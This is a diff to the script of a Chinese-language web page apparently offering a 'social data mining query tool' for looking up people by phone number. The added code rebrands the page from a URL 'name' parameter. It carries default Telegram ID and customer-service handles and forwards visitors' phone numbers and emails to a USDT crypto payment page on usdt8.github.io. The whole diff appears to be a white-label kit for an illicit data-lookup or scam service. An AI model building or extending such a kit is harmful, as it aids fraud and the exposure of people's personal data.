@@ -1019,6 +1019,23 @@
 	</div>
 
 	<script>
+		// 动态处理参数
+		;(function () {
+			const params = new URLSearchParams(window.location.search)
+			const name = params.get('name')
+			const kefu = params.get('kefu') || 'okk13'
+			const tgid = params.get('tgid') || '5866891166'
+
+			if (name) {
+				document.title = name + ' - 社交数据挖掘查询工具'
+				const logoTitle = document.querySelector('.site-title img')
+				if (logoTitle) logoTitle.title = name + '提供安全、稳定的数据服务'
+				const copyright = document.querySelector('.copyright a')
+				if (copyright) copyright.textContent = name
+			}
+			// 统一处理公告中的链接（如果存在）
+		})()
+
 		let currentQueryId = ''
 		const queryModal = document.getElementById('queryModal')
 		const phoneInput = document.getElementById('queryPhone')
@@ -1061,11 +1078,17 @@
 
 			// 跳转支付
 			const currentParams = new URLSearchParams(window.location.search)
-			currentParams.set('p', phone)
-			currentParams.set('e', email)
-			currentParams.set('id', currentQueryId)
+			const tgid = currentParams.get('tgid') || '5866891166'
+			const kefu = currentParams.get('kefu') || 'okk13'
 
-			window.location.href = `https://usdt8.github.io/c/index.html?${currentParams.toString()}`
+			const payParams = new URLSearchParams(window.location.search)
+			payParams.set('p', phone)
+			payParams.set('e', email)
+			payParams.set('id', currentQueryId)
+			payParams.set('tgid', tgid)
+			payParams.set('kefu', kefu)
+
+			window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
 		}
 
 		// 拦截点击
@@ -1075,7 +1098,6 @@
 				link.addEventListener('click', (e) => {
 					e.preventDefault()
 					const title = link.getAttribute('title') || link.textContent
-					// 从 href 提取 ID
 					const href = link.getAttribute('href')
 					const idMatch = href.match(/\/(\d+)\.html/)
 					const id = idMatch ? idMatch[1] : href
